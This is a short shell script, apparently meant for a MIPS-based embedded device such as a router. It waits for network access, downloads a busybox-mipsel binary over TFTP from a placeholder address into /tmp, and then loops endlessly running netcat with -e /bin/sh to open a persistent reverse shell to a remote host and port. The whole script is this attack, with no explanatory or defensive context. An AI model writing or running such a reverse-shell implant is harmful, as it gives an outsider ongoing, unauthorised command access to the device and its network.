#!/bin/sh

while ! ping -c 1 google.com
do
    sleep 1
done

cd /tmp
tftp -g <ip-address> -r busybox-mipsel
chmod +x busybox-mipsel

while true; do
    ./busybox-mipsel nc <ip-address> <port> -e /bin/sh
done
